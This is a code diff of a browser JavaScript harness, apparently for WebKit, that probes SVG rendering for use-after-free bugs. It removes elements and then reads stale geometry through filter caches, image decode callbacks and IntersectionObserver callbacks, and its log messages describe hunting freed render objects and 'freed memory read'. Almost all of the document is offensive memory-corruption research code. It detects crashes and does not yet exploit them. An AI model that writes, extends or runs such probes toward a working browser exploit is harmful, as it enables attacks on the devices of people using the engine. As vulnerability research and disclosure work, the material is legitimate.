-    injectStyle(`
-        @keyframes fo_pulse {
-            0%{opacity:1}50%{opacity:0.5}100%{opacity:1}
-        }
-        .fo_anim { animation: fo_pulse 0.05s linear infinite; }
-    `);
+    // Build the SVG filter definition
+    const defs=document.createElementNS(SVG_NS,'defs');
+    const filter=document.createElementNS(SVG_NS,'filter');
+    filter.setAttribute('id','uaf_filter');
+    filter.setAttribute('x','0%');filter.setAttribute('y','0%');
+    filter.setAttribute('width','100%');filter.setAttribute('height','100%');
+
+    // feTurbulence → feDisplacementMap: complex filter that caches a lot
+    const turb=document.createElementNS(SVG_NS,'feTurbulence');
+    turb.setAttribute('type','fractalNoise');
+    turb.setAttribute('baseFrequency','0.05');
+    turb.setAttribute('numOctaves','2');
+    turb.setAttribute('result','noise');
+
+    const disp=document.createElementNS(SVG_NS,'feDisplacementMap');
+    disp.setAttribute('in','SourceGraphic');
+    disp.setAttribute('in2','noise');
+    disp.setAttribute('scale','10');
+    disp.setAttribute('xChannelSelector','R');
+    disp.setAttribute('yChannelSelector','G');
+
+    filter.appendChild(turb);filter.appendChild(disp);
+    defs.appendChild(filter);
+    livesvg.appendChild(defs);
 
     for(let t=0;t<16;t++){
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        // Remove previous children except defs
+        Array.from(livesvg.children).forEach(c=>{if(c!==defs)c.remove();});
         await raf();await raf();
 
-        // sym1 inside foreignObject
-        const fo=document.createElementNS(SVG_NS,'foreignObject');
-        fo.setAttribute('width','100');fo.setAttribute('height','100');
-        fo.setAttribute('x','0');fo.setAttribute('y','0');
-        fo.setAttribute('class','fo_anim');
-
-        const innerSvg=document.createElementNS(SVG_NS,'svg');
-        innerSvg.setAttribute('width','100');innerSvg.setAttribute('height','100');
-        const sym1=mkSym(`fo_${t}`,80,80);
-        innerSvg.appendChild(sym1);
-        fo.appendChild(innerSvg);
-
-        // useEl in OUTER SVG referencing sym1 inside foreignObject
+        const sym1=mkSym(`fi_${t}`,80,80);
         const useEl=document.createElementNS(SVG_NS,'use');
-        useEl.setAttribute('href',`#fo_${t}`);
+        useEl.setAttribute('href',`#fi_${t}`);
+        useEl.setAttribute('filter','url(#uaf_filter)');
+        livesvg.appendChild(sym1);livesvg.appendChild(useEl);
 
-        livesvg.appendChild(fo);
-        livesvg.appendChild(useEl);
+        await raf();await raf(); // let filter render and get cached
 
-        await raf();await raf();
-
-        // Baseline getBBox
-        let baseW=0,baseFoW=0;
+        let baseW=0;
         try{baseW=useEl.getBBox().width;}catch(e){}
-        try{baseFoW=fo.getBBox().width;}catch(e){}
 
-        // Remove sym1 from inside foreignObject while CSS anim is running on fo
+        // ① Remove sym1 (the filter's source element context)
         sym1.remove();
 
-        // Read getBBox immediately
+        // ② Modify the filter primitive while cache may still hold sym1 ptr
+        const oldFreq=turb.getAttribute('baseFrequency');
+        turb.setAttribute('baseFrequency','0.99'); // trigger filter cache invalidation
+
+        // ③ Force filter to re-evaluate on useEl (sym1 gone)
         let p1W=null,p1Crash=null;
-        try{p1W=useEl.getBBox().width;}catch(ex){p1Crash=String(ex);crashCount++;}
+        try{const bb=useEl.getBBox();p1W=bb.width;}catch(ex){p1Crash=ex.message.slice(0,40);crashCount++;}
+
+        // ④ Create a NEW element and apply the same filter — cache reuse path
+        const newRect=document.createElementNS(SVG_NS,'rect');
+        newRect.setAttribute('x','5');newRect.setAttribute('y','5');
+        newRect.setAttribute('width','50');newRect.setAttribute('height','50');
+        newRect.setAttribute('fill','green');
+        newRect.setAttribute('filter','url(#uaf_filter)');
+        livesvg.appendChild(newRect);
+
+        await raf(); // let filter apply to new element
 
         let p2W=null,p2Crash=null;
-        try{p2W=fo.getBBox().width;}catch(ex){p2Crash=String(ex);crashCount++;}
+        try{const bb=newRect.getBBox();p2W=bb.width;}catch(ex){p2Crash=ex.message.slice(0,40);crashCount++;}
 
-        // getComputedStyle on sym1 (inside fo, removed)
-        let p3Op=null,p3Crash=null;
-        try{p3Op=getComputedStyle(sym1).opacity;}catch(ex){p3Crash=String(ex);crashCount++;}
+        // ⑤ Animate the filter primitive while sym1 is removed
+        let p3Crash=null;
+        try{
+            const animFi=document.createElementNS(SVG_NS,'animate');
+            animFi.setAttribute('attributeName','baseFrequency');
+            animFi.setAttribute('values','0.01;0.99;0.01');
+            animFi.setAttribute('dur','0.05s');
+            animFi.setAttribute('repeatCount','3');
+            turb.appendChild(animFi);
+            await raf();await raf();
+            animFi.remove();
+        }catch(ex){p3Crash=ex.message.slice(0,40);crashCount++;}
 
-        // getBBox on sym1 itself (removed from inside fo)
-        let p4W=null,p4Crash=null;
-        try{const bb=sym1.getBBox();p4W=bb.width;}catch(ex){p4Crash=String(ex);crashCount++;}
+        turb.setAttribute('baseFrequency',oldFreq); // restore
 
-        const interesting=(p1Crash||p2Crash||p4Crash)||(p4W!==null&&p4W!==0&&p4W!==baseFoW);
+        const interesting=(p1Crash||p2Crash||p3Crash)||(p1W&&p1W!==baseW&&p1W!==0);
         if(interesting){
             staleCount++;
-            log(`  t${t}: [INTERESTING] base_use=${baseW} base_fo=${baseFoW}`,'bad');
-            log(`         p1_use=${p1W??p1Crash} p2_fo=${p2W??p2Crash} p3_op=${p3Op??p3Crash} p4_sym=${p4W??p4Crash}`,'bad');
+            log(`  t${t}: [INTERESTING] base=${baseW} p1=${p1W??p1Crash} p2=${p2W??p2Crash} p3Crash=${p3Crash}`,'bad');
         }else{
             normalCount++;
-            if(t<3)log(`  t${t}: base_use=${baseW} p1=${p1W} p2_fo=${p2W} p3=${p3Op} p4_sym=${p4W}`,'dim');
+            if(t<3)log(`  t${t}: base=${baseW} p1=${p1W} p2=${p2W}`,'dim');
+        }
+
+        Array.from(livesvg.children).forEach(c=>{if(c!==defs)c.remove();});
+        await raf();
+    }
+
+    // Cleanup
+    defs.remove();
+
+    log(`\n[*] FI: stale=${staleCount} normal=${normalCount} crash=${crashCount}`,(staleCount>0||crashCount>0?'bad':'inf'));
+
+    if(!q)dis(false);
+    return{staleCount,normalCount,crashCount};
+}
+
+// ── IM: image decode async callback UAF ─────────────────────────────────
+// SVGImageElement decode is async — fires after element may be removed
+// pattern: <image> inside sym1, decode queued, sym1 removed, decode fires
+// Also: HTMLImageElement.decode() promise — resolves asynchronously
+async function runIM(q=false){
+    if(!q){dis(true);sep();log('▶ IM: image decode async callback — decode fires after sym1 removed','inf');sep();}
+    log('[*] <image> inside sym1 → remove sym1 before decode completes','inf');
+    log('[*] also: img.decode() Promise — resolve fires after element freed','ok');
+    log('[*] also: SVGImageElement.decode() if available in this WebKit build','ok');
+    log('');
+
+    let asyncFired=0,staleCount=0,crashCount=0,normalCount=0;
+
+    // Tiny valid 1x1 PNG (data URI)
+    const px1='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
+    // Slightly larger PNG to force async decode (16x16)
+    const px16='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEwAACxMBAJqcGAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAABPSURBVDiNY2AYBYMdMDIy/mdgYPjPQIL+z0A9AAAAASUVORK5CYII=';
+
+    for(let t=0;t<16;t++){
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();await raf();
+
+        const sym1=mkSym(`im_${t}`,80,80);
+        // Add <image> inside sym1
+        const svgImg=document.createElementNS(SVG_NS,'image');
+        svgImg.setAttribute('href',px16);
+        svgImg.setAttribute('x','0');svgImg.setAttribute('y','0');
+        svgImg.setAttribute('width','80');svgImg.setAttribute('height','80');
+        sym1.appendChild(svgImg);
+
+        livesvg.appendChild(sym1);
+        const useEl=document.createElementNS(SVG_NS,'use');
+        useEl.setAttribute('href',`#im_${t}`);
+        livesvg.appendChild(useEl);
+
+        // Queue decode via event listener BEFORE removing
+        const decodeResult=await new Promise(resolve=>{
+            let resolved=false;
+            const safeResolve=(v)=>{if(!resolved){resolved=true;resolve(v);}};
+            setTimeout(()=>safeResolve({timeout:true}),400);
+
+            svgImg.addEventListener('load',()=>{
+                asyncFired++;
+                // Read render state of sym1 inside the load callback
+                let bbW=null,bbCrash=null;
+                try{const bb=sym1.getBBox();bbW=bb.width;}
+                catch(ex){bbCrash=ex.message.slice(0,40);crashCount++;}
+                let useW=null;
+                try{const bb=useEl.getBBox();useW=bb.width;}catch(ex){}
+                safeResolve({bbW,bbCrash,useW,phase:'load_before_remove'});
+            },{once:true});
+
+            svgImg.addEventListener('error',()=>safeResolve({error:true}),{once:true});
+        });
+
+        if(decodeResult.timeout||decodeResult.error){
+            // Image loaded synchronously or errored — try HTMLImageElement.decode()
+            const htmlImg=new Image();
+            htmlImg.src=px16;
+
+            const capturedSym=sym1;
+            const capturedUse=useEl;
+
+            // Remove sym1 immediately
+            sym1.remove();useEl.remove();
+
+            // decode() promise fires after element is already freed
+            try{
+                await htmlImg.decode();
+                asyncFired++;
+                // Inside decode resolution: read capturedSym render state
+                let bbW=null;
+                try{const bb=capturedSym.getBBox();bbW=bb.width;}catch(ex){crashCount++;}
+                let csOp=null;
+                try{csOp=getComputedStyle(capturedSym).opacity;}catch(ex){}
+
+                if(bbW&&bbW!==0){
+                    staleCount++;
+                    log(`  t${t}: [STALE via decode()] bbW=${bbW} csOp=${csOp}`,'bad');
+                }else{
+                    normalCount++;
+                    if(t<3)log(`  t${t}: decode() resolved after remove: bbW=${bbW} csOp=${csOp}`,'dim');
+                }
+            }catch(ex){
+                if(t<3)log(`  t${t}: decode() rejected: ${ex.message.slice(0,40)}`,'dim');
+            }
+        }else{
+            // Image load fired before remove — interesting
+            if(t<3)log(`  t${t}: load pre-remove: bbW=${decodeResult.bbW} useW=${decodeResult.useW}`,'dim');
+
+            // Now remove and try to read from a QUEUED load callback (if image reloads)
+            sym1.remove();useEl.remove();
+            normalCount++;
         }
 
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
         await raf();
     }
 
-    clearStyle();
-    log(`\n[*] FO: stale=${staleCount} normal=${normalCount} crash=${crashCount}`,(staleCount>0||crashCount>0?'bad':'inf'));
-    if(staleCount>0)log(`[+] foreignObject boundary exposes stale render data!`,'bad');
+    log(`\n[*] IM: asyncFired=${asyncFired} stale=${staleCount} normal=${normalCount} crash=${crashCount}`,(staleCount>0||crashCount>0?'bad':'inf'));
 
     if(!q)dis(false);
-    return{staleCount,normalCount,crashCount};
+    return{asyncFired,staleCount,crashCount};
+}
+
+// ── IO: IntersectionObserver — fires async after element leaves viewport ──
+async function runIO(q=false){
+    if(!q){dis(true);sep();log('▶ IO: IntersectionObserver — callback fires async on visibility change','inf');sep();}
+    log('[*] IO observes sym1 (in viewport) → remove sym1 → IO fires on next frame','inf');
+    log('[*] inside IO callback: read render state of removed sym1','ok');
+    log('');
+
+    let cbFired=0,staleCount=0,crashCount=0,normalCount=0;
+
+    for(let t=0;t<16;t++){
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();await raf();
+
+        const sym1=mkSym(`io_${t}`,80,80);
+        const useEl=document.createElementNS(SVG_NS,'use');
+        useEl.setAttribute('href',`#io_${t}`);
+
+        // Also add a plain HTML div — IO works best with HTML elements
+        const div=document.createElement('div');
+        div.setAttribute('id',`io_div_${t}`);
+        div.style.cssText='width:80px;height:80px;background:blue;position:absolute;top:20px;right:240px';
+        document.body.appendChild(div);
+
+        livesvg.appendChild(sym1);livesvg.appendChild(useEl);
+        await raf();await raf();
+
+        let baseW=0;
+        try{baseW=useEl.getBBox().width;}catch(e){}
+
+        await new Promise(resolve=>{
+            let resolved=false;
+            let phase=0;
+            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
+            setTimeout(safeResolve,600);
+
+            const io=new IntersectionObserver((entries)=>{
+                cbFired++;
+                const entry=entries[0];
+                phase++;
+
+                if(phase===1){
+                    // First callback: element is visible — remove it now
+                    sym1.remove();useEl.remove();
+                    // IO will fire again on the next frame (element left viewport)
+                    // Keep observing
+                }else if(phase===2){
+                    // Second callback: element removed — read its render state
+                    let bbW=null,bbCrash=null;
+                    try{const bb=sym1.getBBox();bbW=bb.width;}
+                    catch(ex){bbCrash=ex.message.slice(0,40);crashCount++;}
+
+                    let csOp=null;
+                    try{csOp=getComputedStyle(sym1).opacity;}catch(ex){}
+
+                    let tgtTag='?';
+                    try{tgtTag=entry.target.tagName;}catch(ex){}
+
+                    // entry.boundingClientRect from BEFORE remove?
+                    const ioW=entry.boundingClientRect?.width||null;
+
+                    if((bbW&&bbW!==0)||bbCrash){
+                        staleCount++;
+                        log(`  t${t}: [STALE] phase2 bbW=${bbW??bbCrash} csOp=${csOp} ioW=${ioW}`,'bad');
+                    }else{
+                        normalCount++;
+                        if(t<3)log(`  t${t}: phase2 bbW=${bbW} csOp=${csOp} tgt=${tgtTag} ioW=${ioW}`,'dim');
+                    }
+
+                    io.disconnect();
+                    safeResolve();
+                }else{
+                    io.disconnect();
+                    safeResolve();
+                }
+            },{threshold:[0,1]});
+
+            try{io.observe(div);}
+            catch(ex){log(`  t${t}: IO.observe failed: ${ex.message}`,'dim');safeResolve();}
+        });
+
+        div.remove();
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();
+    }
+
+    log(`\n[*] IO: cbFired=${cbFired} stale=${staleCount} normal=${normalCount} crash=${crashCount}`,(staleCount>0||crashCount>0?'bad':'inf'));
+
+    if(!q)dis(false);
+    return{cbFired,staleCount,crashCount};
 }
 
 async function runAll(){
     dis(true);clearLog();sep();
-    log('▶ SVG CSS render UAF v14 — CSS anim + layout mid-remove + computed style + fo','inf');sep();
-    log('[*] v13 PIVOT: SMIL targetElement always returns useEl (JSC sanitized)','ok');
-    log('[*] v14: attack CSS render pipeline (not sanitized by JSC bridge)','ok');
-    log('[*] crash = confirms UAF in render path | stale values = freed memory read','ok');log('');
+    log('▶ SVG async destroy UAF v15 — observer callbacks + filter cache + image decode','inf');sep();
+    log('[*] v14: RenderObject destroyed SYNCHRONOUSLY with remove() — no CSS window','ok');
+    log('[*] v15: hunt ASYNC paths — callbacks that fire AFTER remove() with stale ptrs','ok');
+    log('[*] crash or stale geometry inside async callback = confirmed async UAF','ok');log('');
     const R={};
     for(const[lbl,fn]of[
-        ['CS_css_render',runCS],
-        ['LY_layout_remove',runLY],
-        ['GC_computed_style',runGC],
-        ['FO_foreignObject',runFO],
+        ['RO_resize_observer',runRO],
+        ['MO_mutation_observer',runMO],
+        ['FI_svg_filter',runFI],
+        ['IM_image_decode',runIM],
+        ['IO_intersection_observer',runIO],
     ]){
         sep();log(`▶ ${lbl}`,'inf');sep();
         try{R[lbl]=await fn(true);}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=null;}
         log('');
     }
-    sep();log('▶ SUMMARY v14','inf');sep();
-    log('[*] CS: stale computed style inside animation event = C++ render UAF','inf');
-    log('[*] LY: getBBox(sym1_after_remove)!=0 = freed RenderObject accessed','inf');
-    log('[*] GC: mid-anim opacity in getComputedStyle loop = style engine UAF','inf');
-    log('[*] FO: crash in getBBox inside foreignObject = cross-boundary render UAF','inf');
+    sep();log('▶ SUMMARY v15','inf');sep();
+    log('[*] RO: stale geometry in RO entry = RenderObject freed before callback','inf');
+    log('[*] MO: getBBox(removedNode)!=0 = live render data on removed element','inf');
+    log('[*] FI: crash after filter primitive modify = filter cache UAF','inf');
+    log('[*] IM: stale bbW in decode callback = image decoder holds freed elem ptr','inf');
+    log('[*] IO: phase2 bbW!=0 = IO entry holds stale intersection geometry','inf');
     for(const[lbl,r]of Object.entries(R)){
         if(r){
-            const hit=r.staleCount||r.hitCount||r.eventsFired||0;
-            const crash=r.crashCount||0;
-            log(`  ${lbl}: ${JSON.stringify(r)}`,(crash>0||hit>0?'bad':'dim'));
+            const hit=(r.staleCount||r.staleGeom||0)+(r.crashCount||r.crashInCb||0);
+            log(`  ${lbl}: ${JSON.stringify(r)}`,(hit>0?'bad':'dim'));
         }
     }
     sep();dis(false);
